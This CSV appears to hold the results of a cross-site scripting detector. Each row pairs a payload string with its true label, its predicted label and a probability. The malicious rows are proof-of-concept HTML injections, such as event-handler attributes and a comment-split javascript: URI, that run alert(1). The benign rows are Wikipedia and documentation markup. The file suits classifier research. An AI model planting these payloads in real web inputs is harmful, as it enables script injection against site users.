Unnamed: 0,payload,label,predicted_label,probability
9812,"<tfoot onpaste=""alert(1)"" contenteditable>test</tfoot>",1,1,0.9979358
1919,"<style>:target {color: red;}</style><picture id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></picture>",1,1,0.9978635
1182,"<blink onkeyup=""alert(1)"" contenteditable>test</blink>",1,1,0.991447
6791,<menuitem onblur=alert(1) tabindex=1 id=x></menuitem><input autofocus>,1,1,0.99780124
8377,"	 </span> <span class=""reference-text""><cite class=""citation web"">Brooks, Rodney (10 November 2014). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20141112130954/http://www.rethinkrobotics.com/artificial-intelligence-tool-threat/"">""artificial intelligence is a tool, not a threat"" </a>. Archived from <a rel=""nofollow"" class=""external text"" href=""http://www.rethinkrobotics.com/artificial-intelligence-tool-threat/"">the original </a> on 12 November 2014. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=artificial+intelligence+is+a+tool%2C+not+a+threat&amp;rft.date=2014-11-10&amp;rft.aulast=Brooks&amp;rft.aufirst=Rodney&amp;rft_id=http%3A%2F%2Fwww.rethinkrobotics.com%2Fartificial-intelligence-tool-threat%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,8.482394e-06
6645,javas<!-- -->cript:alert(''),1,1,0.9950844
8599, </p>,0,0,0.00027944767
9811,"<li id=""cite_note-General_intelligence-19""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-General_intelligence_19-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-General_intelligence_19-1""><sup><i><b>b </b> </i> </sup> </a> ",0,0,0.00011547022
12446,<animatetransform onpointerup=alert(1)>XSS</animatetransform>,1,1,0.99811697
12175,	 </span> </li>,0,0,4.039223e-05
6576,	 </span> </h3>,0,0,4.0975585e-05
4670,"<li><a href=""/wiki/Enterprise_information_system"" title=""Enterprise information system"">Enterprise information system </a> </li>",0,0,0.000109278975
7065,"<embed draggable=""true"" ondragleave=""alert(1)"">test</embed>",1,1,0.997881
13331,<legend onpointerover=alert(1)>XSS</legend>,1,1,0.99604326
4203,"<ul><li><a href=""/wiki/Network_architecture"" title=""Network architecture"">Network architecture </a> </li>",0,0,0.0001441588
12831,<s onpointerover=alert(1)>XSS</s>,1,1,0.9972687
8029,<blockquote onpointerup=alert(1)>XSS</blockquote>,1,1,0.99723357
2259,"<li><a href=""/wiki/Neutral_monism"" title=""Neutral monism"">Neutral monism </a> </li>",0,0,0.00010866589
283,<address id=x tabindex=1 onactivate=alert(1)></address>,1,1,0.99751425
12104,	 </span>,0,0,6.0303642e-05
5846,<output onpointerenter=alert(1)>XSS</output>,1,1,0.9982045
7037,<frame id=x tabindex=1 ondeactivate=alert(1)></frame><input id=y autofocus>,1,1,0.9953789
569,<kbd onfocusout=alert(1) tabindex=1 id=x></kbd><input autofocus>,1,1,0.9965543
1648,"<style>:target {color: red;}</style><span id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></span>",1,1,0.9978667
12689,"<noscript onmouseleave=""alert(1)"">test</noscript>",1,1,0.9980648
6412,"		<li id=""footer-places-developers""><a href=""https://www.mediawiki.org/wiki/Special:MyLanguage/How_to_contribute"">Developers </a> </li>",0,0,1.929618e-05
6711,"<li><a href=""/wiki/Consilience"" title=""Consilience"">Consilience </a> </li>",0,0,0.00018375287
6705,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,0,2.1147165e-05
10451,"<noembed draggable=""true"" ondragstart=""alert(1)"">test</noembed>",1,1,0.99827117
176,<figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>,1,1,0.9800819
9019,document.URL,1,1,0.84209204
1420, ,0,0,0.0009942207
8203,"<li id=""cite_note-22""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-22"">^ </a> </b> ",0,0,0.0002110526
1328,	 </span>,0,0,6.0303642e-05
7942,"          <dd><a href=""/en/master/"">master</a></dd>",0,0,3.8851522e-05
8877,"<li id=""cite_note-208""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-208"">^ </a> </b> ",0,0,0.00017661999
7194,"<style>:target {transform: rotate(180deg);}</style><dl id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dl>",1,1,0.99798626
3039,"    ga('require', 'linker');",0,0,7.182586e-05
5046,"<li><cite id=""CITEREFKurzweil1999"" class=""citation book""><a href=""/wiki/Ray_Kurzweil"" title=""Ray Kurzweil"">Kurzweil, Ray </a> (1999). <a href=""/wiki/The_Age_of_Spiritual_Machines"" title=""The Age of Spiritual Machines""><i>The Age of Spiritual Machines </i> </a>. Penguin Books. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-670-88217-5"" title=""Special:BookSources/978-0-670-88217-5""><bdi>978-0-670-88217-5 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=The+Age+of+Spiritual+Machines&amp;rft.pub=Penguin+Books&amp;rft.date=1999&amp;rft.isbn=978-0-670-88217-5&amp;rft.aulast=Kurzweil&amp;rft.aufirst=Ray&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,0.0007628153
11151,	 </ul>,0,0,3.8504728e-05
8929,"	 <div style=""padding:0em 0.25em"">",0,0,0.0065485397
10575,<address onpointerout=alert(1)>XSS</address>,1,1,0.9980015
6903,"<li><cite id=""CITEREFTecuci2012"" class=""citation journal"">Tecuci, Gheorghe (March–April 2012). ""Artificial Intelligence"". <i>Wiley Interdisciplinary Reviews: Computational Statistics </i>. <b>4 </b> (2): 168–180. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1002%2Fwics.200"">10.1002/wics.200 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Wiley+Interdisciplinary+Reviews%3A+Computational+Statistics&amp;rft.atitle=Artificial+Intelligence&amp;rft.volume=4&amp;rft.issue=2&amp;rft.pages=168-180&amp;rft.date=2012-03%2F2012-04&amp;rft_id=info%3Adoi%2F10.1002%2Fwics.200&amp;rft.aulast=Tecuci&amp;rft.aufirst=Gheorghe&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,2.968524e-06
3014,	 </span> 2019 ,0,0,4.3054843e-05
944,"<base onmousemove=""alert(1)"">test</base>",1,1,0.99804044
12307,<isindex id=x tabindex=1 onfocus=alert(1)></isindex>,1,1,0.9913761
10242,<image3 onpointerup=alert(1)>XSS</image3>,1,1,0.9963167
7923,"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D""></A>",1,0,0.0014478653
7517,"<style>@keyframes x{}</style><details style=""animation-name:x"" onanimationend=""alert(1)""></details>",1,1,0.9975062
1826,"<em onkeypress=""alert(1)"" contenteditable>test</em>",1,1,0.9974476
3428,"<div role=""note"" class=""hatnote navigation-not-searchable"">Further information: <a href=""/wiki/Progress_in_artificial_intelligence"" title=""Progress in artificial intelligence"">Progress in artificial intelligence </a> and <a href=""/wiki/Competitions_and_prizes_in_artificial_intelligence"" title=""Competitions and prizes in artificial intelligence"">Competitions and prizes in artificial intelligence </a> </div>",0,0,0.00038288717
9726,"<li><a href=""/wiki/Thomas_Kuhn"" title=""Thomas Kuhn"">Thomas Kuhn </a> </li>",0,0,0.00017170835
8143,<kbd onpointerdown=alert(1)>XSS</kbd>,1,1,0.9972025
5267,"	 <div style=""padding:0em 0.25em"">",0,0,0.0065485397
8713,"<title onmouseup=""alert(1)"">test</title>",1,1,0.99642
5263,"<template onbeforepaste=""alert(1)"" contenteditable>test</template>",1,1,0.9978819
6235,"<li><a href=""/wiki/Connectionism"" title=""Connectionism"">Connectionism </a> </li>",0,0,0.00020123448
8281,"<li><a href=""/wiki/Randomized_algorithm"" title=""Randomized algorithm"">Randomized algorithm </a> </li>",0,0,0.000107562795
4028,"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 10.1–2, 22 </li> </ul>",0,0,0.00013252105
6802,"<img onkeydown=""alert(1)"" contenteditable>test</img>",1,1,0.9959995
4209,<rtc onpointerout=alert(1)>XSS</rtc>,1,1,0.9979921
6411,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,2.0622756e-05
2050,"<style>:target {color: red;}</style><h1 id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></h1>",1,1,0.9978554
3563,"<div draggable=""true"" contenteditable>drag me</div><wbr ondrop=alert(1) contenteditable>drop here</wbr>",1,1,0.9956304
459,<time onblur=alert(1) tabindex=1 id=x></time><input autofocus>,1,1,0.9971859
9948,"<progress onpaste=""alert(1)"" contenteditable>test</progress>",1,1,0.9983756
3347,<caption onpointerleave=alert(1)>XSS</caption>,1,1,0.99747175
13137,"<sup ondblclick=""alert(1)"">test</sup>",1,1,0.9818526
12411,<base onpointerup=alert(1)>XSS</base>,1,1,0.9978418
12059,"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/commands.html"">Command line tool</a></li>",0,0,0.00015157186
9170,<template onpointerdown=alert(1)>XSS</template>,1,1,0.9979321
1598,"<legend onmouseenter=""alert(1)"">test</legend>",1,1,0.9962434
11200,"<li><a href=""/wiki/Genetic_operators"" class=""mw-redirect"" title=""Genetic operators"">Genetic operators </a> </li>",0,0,0.00011522603
5215,"<i onbeforecopy=""alert(1)"" contenteditable>test</i>",1,1,0.99229664
2577,"<link rel=""canonical"" href=""https://docs.scrapy.org/en/latest/"" />",0,0,0.00021389221
4057,<input id=x tabindex=1 onbeforedeactivate=alert(1)></input><input autofocus>,1,1,0.9934028
6914,"<li><a href=""/wiki/Optical_computing"" title=""Optical computing"">Optical computing </a> </li>",0,0,0.00012871136
7056,"<style>@keyframes slidein {}</style><image style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></image>",1,1,0.99661154
12985,"<p>Computer science defines AI research as the study of ""<a href=""/wiki/Intelligent_agent"" title=""Intelligent agent"">intelligent agents </a>"": any device that perceives its environment and takes actions that maximize its chance of successfully achieving its goals.<sup id=""cite_ref-Definition_of_AI_1-1"" class=""reference""><a href=""#cite_note-Definition_of_AI-1"">&#91;1&#93; </a> </sup> A more elaborate definition characterizes AI as ""a system's ability to correctly interpret external data, to learn from such data, and to use those learnings to achieve specific goals and tasks through flexible adaptation.""<sup id=""cite_ref-61"" class=""reference""><a href=""#cite_note-61"">&#91;61&#93; </a> </sup>",0,0,0.000103363775
12288,"<style>@keyframes slidein {}</style><legend style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></legend>",1,1,0.99648297
8038,<base onfocusout=alert(1) tabindex=1 id=x></base><input autofocus>,1,1,0.99747217
7211,"<li class=""toclevel-3 tocsection-54""><a href=""#Decrease_in_demand_for_human_labor""><span class=""tocnumber"">8.2.4 ",0,0,0.00012409964
10498,<header onpointerover=alert(1)>XSS</header>,1,1,0.9961094
5754, </li>,0,0,0.00012413738
10571,"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://searcherp.techtarget.com/news/252460208/Oracle-CEO-Mark-Hurd-sees-no-reason-to-fear-ERP-AI"">""Oracle CEO Mark Hurd sees no reason to fear ERP AI"" </a>. <i>SearchERP </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">6 May ",0,0,2.0535523e-05
2096,"<style>:target {color: red;}</style><fieldset id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></fieldset>",1,1,0.9978258
906,"<embed onclick=""alert(1)"">test</embed>",1,1,0.9958001
4495,"<dd>Machines are <i>already </i> intelligent, but observers have failed to recognize it. When <a href=""/wiki/Deep_Blue_(chess_computer)"" title=""Deep Blue (chess computer)"">Deep Blue </a> beat <a href=""/wiki/Garry_Kasparov"" title=""Garry Kasparov"">Garry Kasparov </a> in chess, the machine was acting intelligently. However, onlookers commonly discount the behavior of an artificial intelligence program by arguing that it is not ""real"" intelligence after all; thus ""real"" intelligence is whatever intelligent behavior people can do that machines still cannot. This is known as the AI Effect: ""AI is whatever hasn't been done yet."" </dd> </dl>",0,0,4.9406635e-06
13553, </li>,0,0,0.00012413738
8953,"<a draggable=""true"" ondragstart=""alert(1)"">test</a>",1,1,0.99693257
12452,"<map oncut=""alert(1)"" contenteditable>test</map>",1,1,0.997554
4648,"<div draggable=""true"" contenteditable>drag me</div><option ondragover=alert(1) contenteditable>drop here</option>",1,1,0.9956685
275,"<li id=""cite_note-378""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-378"">^ </a> </b> ",0,0,0.00021688476
4429,"	 </span> <span class=""reference-text"">",0,0,4.9663875e-05
566,"<li><a href=""/wiki/Modeling_language"" title=""Modeling language"">Modeling language </a> </li>",0,0,0.00019152442
8775,"      <li><a href=""#"">Docs</a> &raquo;</li>",0,0,4.1878066e-05
782,<param onfocusout=alert(1) tabindex=1 id=x></param><input autofocus>,1,1,0.99792945
7414,"<li id=""cite_note-sf-345""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-sf_345-0"">^ </a> </b> ",0,0,0.00025745353
11460,"    <div id=""mw-head"">    ",0,0,5.8384063e-05
8927,<li onpointerup=alert(1)>XSS</li>,1,1,0.985089
5723,"<title draggable=""true"" ondragenter=""alert(1)"">test</title>",1,1,0.9962228
3314,"<colgroup onmousemove=""alert(1)"">test</colgroup>",1,1,0.9977166
11809,<xmp onpointerout=alert(1)>XSS</xmp>,1,1,0.99807227
12024,"<iframe oncontextmenu=""alert(1)"">test</iframe>",1,1,0.99581325
11203,"<rp onpaste=""alert(1)"" contenteditable>test</rp>",1,1,0.99758554
7764,"<li><cite id=""CITEREFSearle1999"" class=""citation book""><a href=""/wiki/John_Searle"" title=""John Searle"">Searle, John </a> (1999). <a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/mindlanguagesoci00sear""><i>Mind, language and society </i> </a>. New York, NY: Basic Books. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-465-04521-1"" title=""Special:BookSources/978-0-465-04521-1""><bdi>978-0-465-04521-1 </bdi> </a>. <a href=""/wiki/OCLC"" title=""OCLC"">OCLC </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//www.worldcat.org/oclc/231867665"">231867665 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Mind%2C+language+and+society&amp;rft.place=New+York%2C+NY&amp;rft.pub=Basic+Books&amp;rft.date=1999&amp;rft_id=info%3Aoclcnum%2F231867665&amp;rft.isbn=978-0-465-04521-1&amp;rft.aulast=Searle&amp;rft.aufirst=John&amp;rft_id=https%3A%2F%2Farchive.org%2Fdetails%2Fmindlanguagesoci00sear&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,6.591651e-07
5663,<svg><optgroup onload=alert(1)></optgroup>,1,1,0.9980434
7624,"<td onmousedown=""alert(1)"">test</td>",1,1,0.99759865
1430,<svg><q onload=alert(1)></q>,1,1,0.99647063
2999,"    <div class=""rst-footer-buttons"" role=""navigation"" aria-label=""footer navigation"">",0,0,6.3477986e-05
8232,<article onpointerup=alert(1)>XSS</article>,1,1,0.9971146
8506,"<del onmouseover=""alert(1)"">test</del>",1,1,0.9962228
4641,"<isindex onkeypress=""alert(1)"" contenteditable>test</isindex>",1,1,0.9950275
7663,"<div draggable=""true"" contenteditable>drag me</div><iframe ondrop=alert(1) contenteditable>drop here</iframe>",1,1,0.9956178
491,	 </span> </a>,0,0,4.409406e-05
10737,"	 </span> <span class=""toctext"">Tools ",0,0,0.0004966411
6221,"<code onpaste=""alert(1)"" contenteditable>test</code>",1,1,0.99751055
4280,<b onpointerdown=alert(1)>XSS</b>,1,1,0.99719584
3711,	 </span> ,0,0,5.1390383e-05
1738,"<li class=""toclevel-2 tocsection-40""><a href=""#Government""><span class=""tocnumber"">7.5 ",0,0,0.0001262701
3073,"<code onmousemove=""alert(1)"">test</code>",1,1,0.9977863
1883,"<area draggable=""true"" ondrag=""alert(1)"">test</area>",1,1,0.9978663
12213,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frame id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></frame>",1,1,0.9974925
5684,	 </span>,0,0,6.0303642e-05
6046,<input4 onpointerleave=alert(1)>XSS</input4>,1,1,0.99524707
1612,"<li><cite class=""citation journal"">Serenko, Alexander; Michael Dohan (2011). <a rel=""nofollow"" class=""external text"" href=""http://www.aserenko.com/papers/JOI_AI_Journal_Ranking_Serenko.pdf"">""Comparing the expert survey and citation impact journal ranking methods: Example from the field of Artificial Intelligence"" </a> <span class=""cs1-format"">(PDF) ",0,0,0.0001316948
10857,"<li><a href=""/wiki/Magnetoresistive_random-access_memory"" title=""Magnetoresistive random-access memory"">MRAM </a> </li>",0,0,0.00010511325
1417,<footer id=x tabindex=1 onbeforeactivate=alert(1)></footer>,1,1,0.99711704
8134, ,0,0,0.0009942207
11707,"<li><a href=""/wiki/Network_security"" title=""Network security"">Network security </a> </li>",0,0,0.00011921089
7084,"<meta name=""referrer"" content=""origin""/>",0,1,0.99773556
10407,	 </span> </li>,0,0,4.039223e-05
7487,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Business+Insider&amp;rft.atitle=Mark+Zuckerberg+responds+to+Elon+Musk%27s+paranoia+about+AI%3A+%27AI+is+going+to...+help+keep+our+communities+safe.%27&amp;rft.date=2018-05-25&amp;rft_id=https%3A%2F%2Fwww.businessinsider.com%2Fmark-zuckerberg-shares-thoughts-elon-musks-ai-2018-5&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,3.1931602e-06
7670,<applet id=x tabindex=1 onfocusin=alert(1)></applet>,1,1,0.9946253
13072,"<li><a href=""/wiki/Wikipedia:WikiProject_Philosophy/Mind"" title=""Wikipedia:WikiProject Philosophy/Mind"">Task Force </a> </li>",0,0,0.00018213812
312,"<li id=""cite_note-393""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-393"">^ </a> </b> ",0,0,0.00019741227
3236,"	 </span> <span class=""reference-text""><cite class=""citation web"">Maloof, Mark. <a rel=""nofollow"" class=""external text"" href=""http://people.cs.georgetown.edu/~maloof/cosc270.f17/cosc270-intro-handout.pdf"">""Artificial Intelligence: An Introduction, p. 37"" </a> <span class=""cs1-format"">(PDF) ",0,0,2.053192e-05
12270,"<output onmouseover=""alert(1)"">test</output>",1,1,0.99826
7024,"<td onclick=""alert(1)"">test</td>",1,1,0.9925356
13457,"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://betanews.com/2016/10/21/artificial-intelligence-stephen-hawking/"">""Stephen Hawking believes AI could be mankind's last accomplishment"" </a>. <i>BetaNews </i>. 21 October 2016. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20170828183930/https://betanews.com/2016/10/21/artificial-intelligence-stephen-hawking/"">Archived </a> from the original on 28 August 2017. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=BetaNews&amp;rft.atitle=Stephen+Hawking+believes+AI+could+be+mankind%27s+last+accomplishment&amp;rft.date=2016-10-21&amp;rft_id=https%3A%2F%2Fbetanews.com%2F2016%2F10%2F21%2Fartificial-intelligence-stephen-hawking%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,4.4980086e-05
6390,<caption id=x tabindex=1 onfocusin=alert(1)></caption>,1,1,0.99652886
13246,"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Symbolic_AI"" class=""mw-redirect"" title=""Symbolic AI"">Symbolic AI </a> </div>",0,0,0.0003836197
3962,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><style id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></style>",1,1,0.9974925
13055,<tfoot id=x tabindex=1 ondeactivate=alert(1)></tfoot><input id=y autofocus>,1,1,0.99718434
9523,"<style>:target {transform: rotate(180deg);}</style><del id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></del>",1,1,0.9979864
11408,"<li id=""cite_note-85""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-85"">^ </a> </b> ",0,0,0.00021820563
4540,<map id=x tabindex=1 onfocusin=alert(1)></map>,1,1,0.9960757
11571,"<li onbeforecopy=""alert(1)"" contenteditable>test</li>",1,1,0.9768418
6872,<img onpointerover=alert(1)>XSS</img>,1,1,0.99699324
12719,"	 </span> <span class=""reference-text"">",0,0,4.9663875e-05
3704,		 </div> </div>,0,0,2.8230388e-05
4442,"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Friendly_AI"" class=""mw-redirect"" title=""Friendly AI"">Friendly AI </a> </div>",0,0,0.00038346945
4561,"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a><sup class=""noprint Inline-Template"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/Wikipedia:Citing_sources"" title=""Wikipedia:Citing sources""><span title=""This citation requires a reference to the specific page or range of pages in which the material appears. (February 2011)"">page&#160;needed ",0,0,0.0001374926
11759,"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.statefestival.org/program/2017/unhuman-art-in-the-age-of-ai"">""Unhuman: Art in the Age of AI – State Festival"" </a>. Statefestival.org<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">13 September ",0,0,2.0535563e-05
6306,<svg><sub onload=alert(1)></sub>,1,1,0.99703276
10180,"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,0,6.386378e-05
7049, ,0,0,0.0009942207
106,"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;649–788, </li>",0,0,0.0001375511
7100,"<li><a href=""/wiki/Fallibilism"" title=""Fallibilism"">Fallibilism </a> </li>",0,0,0.00017047912
4023,"<div draggable=""true"" contenteditable>drag me</div><a ondrop=alert(1) contenteditable>drop here</a>",1,1,0.99565876
9277,"<li><a href=""/wiki/Social_computing"" title=""Social computing"">Social computing </a> </li>",0,0,0.0001822778
6324, ,0,0,0.0009942207
1849,	 </span> </h3>,0,0,4.0975585e-05
7748,"<audio onmouseenter=""alert(1)"">test</audio>",1,1,0.9972542
1234,"<li><a href=""/wiki/Knowledge_extraction"" title=""Knowledge extraction"">Knowledge extraction </a> </li>",0,0,0.0001215653
6205, </p>,0,0,0.00027944767
11937,"<style>@keyframes x{}</style><video style=""animation-name:x"" onanimationend=""alert(1)""></video>",1,1,0.99750686
11936,	 </span>,0,0,6.0303642e-05
9102,<dir id=x tabindex=1 ondeactivate=alert(1)></dir><input id=y autofocus>,1,1,0.9931702
7980,"	 </span> <span class=""toctext"">Deep feedforward neural networks ",0,0,0.0001251888
7846,"	 </span> <span class=""reference-text"">",0,0,4.9663875e-05
5072,<h1 onblur=alert(1) tabindex=1 id=x></h1><input autofocus>,1,1,0.99390936
2640,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/>. </li>",0,0,2.1335367e-05
5714,"<style>:target {color: red;}</style><nextid id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></nextid>",1,1,0.9978703
7763,"<audio onmousemove=""alert(1)"">test</audio>",1,1,0.99727136
6195,"<style draggable=""true"" ondrag=""alert(1)"">test</style>",1,1,0.9974827
12464,	 </span> </li>,0,0,4.039223e-05
4939,<rb id=x tabindex=1 onfocusin=alert(1)></rb>,1,1,0.9961099
8327,"<nav onmouseout=""alert(1)"">test</nav>",1,1,0.9979113
4498,"<li><a href=""/wiki/Geographic_information_system"" title=""Geographic information system"">Geographic information system </a> </li>",0,0,0.000122205
9723,"<kbd oncontextmenu=""alert(1)"">test</kbd>",1,1,0.9976759
2788,"<li><i><a href=""/wiki/Our_Final_Invention"" title=""Our Final Invention"">Our Final Invention </a> </i> </li>",0,0,0.00014119009
12602,<shadow id=x tabindex=1 onactivate=alert(1)></shadow>,1,1,0.9830331
1760,"<samp onclick=""alert(1)"">test</samp>",1,1,0.99559313
1492,<h1 onpointerenter=alert(1)>XSS</h1>,1,1,0.9955697
905,"<ul onbeforecut=""alert(1)"" contenteditable>test</ul>",1,1,0.99039483
7751,"<html ondblclick=""alert(1)"">test</html>",1,1,0.93854135
9022,			Print/export,0,0,4.3156702e-05
4704,"<style>:target {color: red;}</style><bdo id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></bdo>",1,1,0.99786776
3647,"<li><cite id=""CITEREFRajani2011"" class=""citation journal"">Rajani, Sandeep (2011). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20130118095844/http://www.csjournals.com/IJITKM/PDF%204-1/35.Sandeep%20Rajani.pdf"">""Artificial Intelligence – Man or Machine"" </a> <span class=""cs1-format"">(PDF) ",0,0,0.00013180498
12852,"	 </span> <span class=""reference-text""><cite class=""citation journal""><a href=""/wiki/David_Chalmers"" title=""David Chalmers"">Chalmers, David </a> (1995). <a rel=""nofollow"" class=""external text"" href=""http://www.imprint.co.uk/chalmers.html"">""Facing up to the problem of consciousness"" </a>. <i><a href=""/wiki/Journal_of_Consciousness_Studies"" title=""Journal of Consciousness Studies"">Journal of Consciousness Studies </a> </i>. <b>2 </b> (3): 200–219. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Journal+of+Consciousness+Studies&amp;rft.atitle=Facing+up+to+the+problem+of+consciousness&amp;rft.volume=2&amp;rft.issue=3&amp;rft.pages=200-219&amp;rft.date=1995&amp;rft.aulast=Chalmers&amp;rft.aufirst=David&amp;rft_id=http%3A%2F%2Fwww.imprint.co.uk%2Fchalmers.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,2.9291311e-06
4427,"<keygen draggable=""true"" ondragleave=""alert(1)"">test</keygen>",1,1,0.9977673
11579, </div> </td> </tr> </tbody> </table> </div>,0,0,8.289549e-05
8716,"<li id=""cite_note-Bayesian_networks-205""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Bayesian_networks_205-0"">^ </a> </b> ",0,0,0.00032384042
11043,"<nav draggable=""true"" ondrag=""alert(1)"">test</nav>",1,1,0.9976117
